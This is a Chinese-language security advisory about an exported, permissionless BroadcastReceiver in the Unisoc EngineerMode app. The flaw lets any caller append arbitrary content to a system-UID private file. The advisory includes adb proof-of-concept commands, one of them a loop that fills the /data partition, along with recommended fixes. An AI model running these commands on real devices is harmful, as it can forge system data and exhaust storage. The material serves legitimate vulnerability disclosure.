# V10 — `ModemAssertReceiver` system 私有目录任意内容写入

| 项 | 值 |
|----|----|
| **严重性** | 🟠 高 |
| **CWE** | CWE-862 Missing Authorization / CWE-400 Uncontrolled Resource Consumption |
| **受影响应用** | `com.sprd.engineermode` |
| **UID** | **1000** |
| **组件** | `com.unisoc.engineermode.modules.debuglog.switchmachineinfo.ModemAssertInfoActivity$ModemAssertReceiver` |
| **exported** | `true` |
| **permission** | **无** |
| **实机验证** | ✅ 已确认 |

---

## 1. 摘要

一个导出的 BroadcastReceiver，接收 `modem_info` 字符串并**追加写入**
EngineerMode 的私有目录（system UID 所有）。因是追加模式且无长度限制，
可造成任意内容写入 + 磁盘填充 DoS。

## 2. 漏洞代码

```java
// ModemAssertInfoActivity$ModemAssertReceiver
public void onReceive(Context context, Intent intent) {
    String modemAsserStat = intent.getStringExtra("modem_stat");
    if (!"modem_assert".equals(modemAsserStat)) return;

    SwitchBaseActivity.mModemAssertCount++;
    String modemAsserInfo = intent.getStringExtra("modem_info");   // ← 外部可控

    StringBuilder sb = new StringBuilder();
    sb.append(date);            // "MM-dd HH:mm:ss"
    sb.append("   ");
    sb.append(modemAsserInfo);

    SwitchBaseActivity.saveToInternal(sb.toString());
}

// SwitchBaseActivity
public static void saveToInternal(String modemData) {
    if (getInternalFreeSize() <= 2) { ... return; }   // 只检查剩余空间
    EMFileUtils.newFolder("/data/data/com.sprd.engineermode/files/EmInfo");
    EMFileUtils.write(MODEM_ASSERT_FILE, modemData + "\n", true);  // append=true
}
```

目标文件：`/data/data/com.sprd.engineermode/files/EmInfo/modem_assert_info.xml`

## 3. 影响

1. **任意内容写入** system UID 私有目录 —— 文件内容可被伪造
2. **无限追加** —— 快速发送大量广播可将 `/data` 分区填满
3. **UI 污染** —— 注入内容会显示在 EngineerMode 的 Modem Assert 列表里
4. 该文件被当作 XML 解析（`saveToSd` / 展示），注入畸形内容可能引发解析异常

## 4. 复现

```bash
adb shell am broadcast \
  -a com.sprd.engineermode.MODEM_ASSERT_INFO \
  -n 'com.sprd.engineermode/com.unisoc.engineermode.modules.debuglog.switchmachineinfo.ModemAssertInfoActivity$ModemAssertReceiver' \
  --es modem_stat "modem_assert" \
  --es modem_info "INJECTED_BY_POC"
```

**验证**：EngineerMode → DEBUG&LOG → Switch Machine Info → Modem assert Info
实机结果（截取）：

```
1    11-16 06:09:25    INJECTED_BY_POC
```

**回滚**：在该页面点击「清除文件信息」。

### 磁盘填充 PoC（谨慎，仅测试机）

```bash
for i in $(seq 1 10000); do
  adb shell am broadcast -a com.sprd.engineermode.MODEM_ASSERT_INFO \
    -n 'com.sprd.engineermode/...$ModemAssertReceiver' \
    --es modem_stat modem_assert \
    --es modem_info "$(head -c 4000 /dev/zero | tr '\0' 'A')"
done
```

## 5. 修复建议

```xml
<receiver android:name="...$ModemAssertReceiver"
          android:exported="false" />
```

另建议：对 `modem_info` 限长（如 256 字节）、校验来源 UID、限制单日写入总量。
